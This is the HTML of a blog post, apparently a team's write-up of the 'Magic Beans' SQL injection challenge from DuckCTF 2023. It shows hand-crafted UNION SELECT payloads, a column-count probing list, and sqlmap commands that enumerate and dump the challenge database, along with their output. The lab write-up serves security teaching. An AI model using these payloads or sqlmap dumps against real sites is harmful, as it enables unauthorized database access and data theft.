<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Magic Beans - DuckCTF 2023 | AdelaideB9 Blog</title><meta name=keywords content><meta name=description content="Hidden beneath this strange jelly bean themed website is a flag; a flag hidden within a table aptly named Flag, and sprinkled letter-by-letter along single character columns titled 'a', 'b', 'c', 'd', ..."><meta name=author content="javad"><link rel=canonical href=https://blog.adelaideb9.com/posts/2023/duckctf/magic-beans/><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://blog.adelaideb9.com/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.adelaideb9.com/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.adelaideb9.com/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.adelaideb9.com/apple-touch-icon.png><link rel=mask-icon href=https://blog.adelaideb9.com/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css integrity=sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js integrity=sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4 crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js integrity=sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa crossorigin=anonymous onload='renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"\\[",right:"\\]",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1}]})'></script><meta property="og:title" content="Magic Beans - DuckCTF 2023"><meta property="og:description" content="Hidden beneath this strange jelly bean themed website is a flag; a flag hidden within a table aptly named Flag, and sprinkled letter-by-letter along single character columns titled 'a', 'b', 'c', 'd', ..."><meta property="og:type" content="article"><meta property="og:url" content="https://blog.adelaideb9.com/posts/2023/duckctf/magic-beans/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-08-11T00:00:00+00:00"><meta property="article:modified_time" content="2023-08-11T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Magic Beans - DuckCTF 2023"><meta name=twitter:description content="Hidden beneath this strange jelly bean themed website is a flag; a flag hidden within a table aptly named Flag, and sprinkled letter-by-letter along single character columns titled 'a', 'b', 'c', 'd', ..."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.adelaideb9.com/posts/"},{"@type":"ListItem","position":2,"name":"Magic Beans - DuckCTF 2023","item":"https://blog.adelaideb9.com/posts/2023/duckctf/magic-beans/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Magic Beans - DuckCTF 2023","name":"Magic Beans - DuckCTF 2023","description":"Hidden beneath this strange jelly bean themed website is a flag; a flag hidden within a table aptly named Flag, and sprinkled letter-by-letter along single character columns titled 'a', 'b', 'c', 'd', ...","keywords":[],"articleBody":"We’re presented with a largely static, single-page site - save for one input field that doesn’t seem to be processed on the client side. The challenge description also draws special attention to ‘columns’ and ’tables’. Given that there aren’t any HTML tables in the source, instinct says this might involve a database.\nIf we try a classic single-quote injection (') we see the quote suspiciously disappear. Adding on both a semi-colon to terminate the SQL statement and a comment afterwards ('; -- ) we see that vanish as well! Clearly, the backend is handling this input differently from regular text.\nWe know from the challenge description that we need to read from a table called Flag (in the database). A good way is to tack this on to the input we’re already getting (all the delicious beans) using a UNION attack. This is where some googling and trial-and-error comes in to craft just the right payload. Here’s what we came up with:\n' UNION ALL SELECT a, b, c, d, e FROM Flag; -- Be aware that there is some input validation on the client side! Submitting certain characters or too many characters may not work. Instead, try making the POST request using a tool like Insomnia or Postman.\nSome notable observations about this payload:\nMake sure to have a space after the comment (--), injection is finicky. We use UNION ALL SELECT instead of UNION SELECT, just to make sure that no duplicate rows are removed (although that’s unlikely in this situation). We know which columns and tables to we want thanks to info from the challenge description. We only select five columns (a, b, c, d, e), since a UNION SELECT will only work if the number of columns appended matches the number we’re already getting. Any more or any less will give us ‘No results found.’ indicating our payload failed. A good way to figure out the number of columns we need to UNION SELECT is to test each of the following statements, one at a time, until one works. One of these statements should succeed, even if we don’t know the names of the columns/table.\n' UNION ALL SELECT NULL -- ' UNION ALL SELECT NULL,NULL -- ' UNION ALL SELECT NULL,NULL,NULL -- ' UNION ALL SELECT NULL,NULL,NULL,NULL -- ' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL -- ... Our functioning payload from before should give us a new bean entry at the very bottom, with the letters ‘u’, ‘a’, ‘c’, visible (part of the flag format quack{}). Nice! Rotating through the alphabet of course could give us the flag, but that seems rather tedious. Instead, we can concatenate all the columns in the table Flag in a payload like this:\n~' UNION ALL SELECT NULL, CONCAT(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w), NULL, NULL, NULL FROM Flag; -- Some trial-and-error tells us that columns a-w are valid. Substituting the concatenated columns into the second union-selected column instead of the first will show the flag where the bean name would usually be (in nice big letters). Adding a tilde at the beginning (~) is just to clear out all other search results (since none of the bean names includes a ~).\nFlag: quack{J3lly_83lly_ru5H}\nUsing sqlmap While we can totally craft our own payloads, using an automated tool can be far easier. Sqlmap is awesome, and allows us to solve this challenge without any of the hints given in the challenge description.\nLet’s take this from the top. First, let’s check if injection is possible. The following command specifies the URL, the form data (which is one search parameter), and states that we are making a POST request.\nsqlmap -u \"http://chall.duckctf.com:8080/index.php\" --data \"search=*\" -p \"search\" --method POST The output tells us injection is possible! We can now add on --dbs to get the names of all databases.\nsqlmap -u \"http://chall.duckctf.com:8080/index.php\" --data \"search=*\" -p \"search\" --method POST --dbs ... available databases [2]: [*] beantome [*] information_schema Other than the usual ‘information_schema’, ‘beantome’ is the only database of interest. Let’s see what tables are inside …\nsqlmap -u \"http://chall.duckctf.com:8080/index.php\" --data \"search=*\" -p \"search\" --method POST --tables -D beantome ... Database: beantome [2 tables] +-------+ | Beans | | Flag | +-------+ Hmm, two interesting tables. I’m guessing that all our delicious bean flavours are inside ‘Beans’ so let’s turn our attention and dump the contents of ‘Flag’.\nsqlmap -u \"http://chall.duckctf.com:8080/index.php\" --data \"search=*\" -p \"search\" --method POST --dump -T Flag -D beantome ... Database: beantome Table: Flag [1 entry] +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+ | a | b | c | d | e | f | g | h | i | j | k | l | m | n | o | p | q | r | s | t | u | v | w | +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+ | q | u | a | c | k | { | J | 3 | l | l | y | _ | 8 | 3 | l | l | y | _ | r | u | 5 | H | } | +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+ Flag: quack{J3lly_83lly_ru5H}\n","wordCount":"839","inLanguage":"en","datePublished":"2023-08-11T00:00:00Z","dateModified":"2023-08-11T00:00:00Z","author":{"@type":"Person","name":"javad"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.adelaideb9.com/posts/2023/duckctf/magic-beans/"},"publisher":{"@type":"Organization","name":"AdelaideB9 Blog","logo":{"@type":"ImageObject","url":"https://blog.adelaideb9.com/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.adelaideb9.com/ accesskey=h title="AdelaideB9 Blog (Alt + H)">AdelaideB9 Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.adelaideb9.com/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://blog.adelaideb9.com/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://blog.adelaideb9.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.adelaideb9.com/>Home</a>&nbsp;»&nbsp;<a href=https://blog.adelaideb9.com/posts/>Posts</a></div><h1 class=post-title>Magic Beans - DuckCTF 2023</h1><div class=post-description>Hidden beneath this strange jelly bean themed website is a flag; a flag hidden within a table aptly named Flag, and sprinkled letter-by-letter along single character columns titled 'a', 'b', 'c', 'd', ...</div><div class=post-meta><span title='2023-08-11 00:00:00 +0000 UTC'>August 11, 2023</span>&nbsp;·&nbsp;javad</div></header><div class=post-content><p>We&rsquo;re presented with a largely static, single-page site - save for one input field that doesn&rsquo;t seem to be processed on the client side. The challenge description also draws special attention to &lsquo;columns&rsquo; and &rsquo;tables&rsquo;. Given that there aren&rsquo;t any HTML tables in the source, instinct says this might involve a database.</p><p>If we try a classic single-quote injection (<code>'</code>) we see the quote suspiciously disappear. Adding on both a semi-colon to terminate the SQL statement and a comment afterwards (<code>'; -- </code>) we see that vanish as well! Clearly, the backend is handling this input differently from regular text.</p><p>We know from the challenge description that we need to read from a table called Flag (in the database). A good way is to tack this on to the input we&rsquo;re already getting (all the delicious beans) using a UNION attack. This is where some googling and trial-and-error comes in to craft just the right payload. Here&rsquo;s what we came up with:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#e6db74>&#39; UNION ALL SELECT a, b, c, d, e FROM Flag; -- 
</span></span></span></code></pre></div><p>Be aware that there is some <strong>input validation on the client side</strong>! Submitting certain characters or too many characters may not work. Instead, try making the POST request using a tool like <a href=https://insomnia.rest/>Insomnia</a> or <a href=https://www.postman.com/>Postman</a>.</p><p>Some notable observations about this payload:</p><ul><li>Make sure to have a space after the comment (<code>--</code>), injection is finicky.</li><li>We use <code>UNION ALL SELECT</code> instead of <code>UNION SELECT</code>, just to make sure that no duplicate rows are removed (although that&rsquo;s unlikely in this situation).</li><li>We know which columns and tables to we want thanks to info from the challenge description.</li><li>We only select five columns (<code>a, b, c, d, e</code>), since a <code>UNION SELECT</code> will only work if the number of columns appended matches the number we&rsquo;re already getting. Any more or any less will give us &lsquo;No results found.&rsquo; indicating our payload failed.</li></ul><p>A good way to figure out the number of columns we need to <code>UNION SELECT</code> is to test each of the following statements, one at a time, until one works. One of these statements should succeed, even if we don&rsquo;t know the names of the columns/table.</p><pre tabindex=0><code>&#39; UNION ALL SELECT NULL -- 
&#39; UNION ALL SELECT NULL,NULL -- 
&#39; UNION ALL SELECT NULL,NULL,NULL -- 
&#39; UNION ALL SELECT NULL,NULL,NULL,NULL -- 
&#39; UNION ALL SELECT NULL,NULL,NULL,NULL,NULL -- 
...
</code></pre><p>Our functioning payload from before should give us a new bean entry at the very bottom, with the letters &lsquo;u&rsquo;, &lsquo;a&rsquo;, &lsquo;c&rsquo;, visible (part of the flag format <code>quack{}</code>). Nice! Rotating through the alphabet of course could give us the flag, but that seems rather tedious. Instead, we can concatenate all the columns in the table Flag in a payload like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>~</span><span style=color:#e6db74>&#39; UNION ALL SELECT NULL, CONCAT(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w), NULL, NULL, NULL FROM Flag; -- 
</span></span></span></code></pre></div><p>Some trial-and-error tells us that columns a-w are valid. Substituting the concatenated columns into the second union-selected column instead of the first will show the flag where the bean name would usually be (in nice big letters). Adding a tilde at the beginning (<code>~</code>) is just to clear out all other search results (since none of the bean names includes a <code>~</code>).</p><p><strong>Flag</strong>: <code>quack{J3lly_83lly_ru5H}</code></p><h2 id=using-sqlmap>Using sqlmap<a hidden class=anchor aria-hidden=true href=#using-sqlmap>#</a></h2><p>While we can totally craft our own payloads, using an automated tool can be far easier. <a href=https://sqlmap.org/>Sqlmap</a> is awesome, and allows us to solve this challenge without any of the hints given in the challenge description.</p><p>Let&rsquo;s take this from the top. First, let&rsquo;s check if injection is possible. The following command specifies the URL, the form data (which is one search parameter), and states that we are making a POST request.</p><pre tabindex=0><code>sqlmap -u &#34;http://chall.duckctf.com:8080/index.php&#34; --data &#34;search=*&#34; -p &#34;search&#34; --method POST
</code></pre><p>The output tells us injection is possible! We can now add on <code>--dbs</code> to get the names of all databases.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u <span style=color:#e6db74>&#34;http://chall.duckctf.com:8080/index.php&#34;</span> --data <span style=color:#e6db74>&#34;search=*&#34;</span> -p <span style=color:#e6db74>&#34;search&#34;</span> --method POST --dbs
</span></span></code></pre></div><pre tabindex=0><code>...

available databases [2]:
[*] beantome
[*] information_schema
</code></pre><p>Other than the usual &lsquo;information_schema&rsquo;, &lsquo;beantome&rsquo; is the only database of interest. Let&rsquo;s see what tables are inside &mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u <span style=color:#e6db74>&#34;http://chall.duckctf.com:8080/index.php&#34;</span> --data <span style=color:#e6db74>&#34;search=*&#34;</span> -p <span style=color:#e6db74>&#34;search&#34;</span> --method POST --tables -D beantome
</span></span></code></pre></div><pre tabindex=0><code>...

Database: beantome
[2 tables]
+-------+
| Beans |
| Flag  |
+-------+
</code></pre><p>Hmm, two interesting tables. I&rsquo;m guessing that all our delicious bean flavours are inside &lsquo;Beans&rsquo; so let&rsquo;s turn our attention and dump the contents of &lsquo;Flag&rsquo;.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u <span style=color:#e6db74>&#34;http://chall.duckctf.com:8080/index.php&#34;</span> --data <span style=color:#e6db74>&#34;search=*&#34;</span> -p <span style=color:#e6db74>&#34;search&#34;</span> --method POST --dump -T Flag -D beantome
</span></span></code></pre></div><pre tabindex=0><code>...

Database: beantome
Table: Flag
[1 entry]
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| a | b | c | d | e | f | g | h | i | j | k | l | m | n | o | p | q | r | s | t | u | v | w |
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| q | u | a | c | k | { | J | 3 | l | l | y | _ | 8 | 3 | l | l | y | _ | r | u | 5 | H | } |
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
</code></pre><p><strong>Flag</strong>: <code>quack{J3lly_83lly_ru5H}</code></p></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://blog.adelaideb9.com/>AdelaideB9 Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>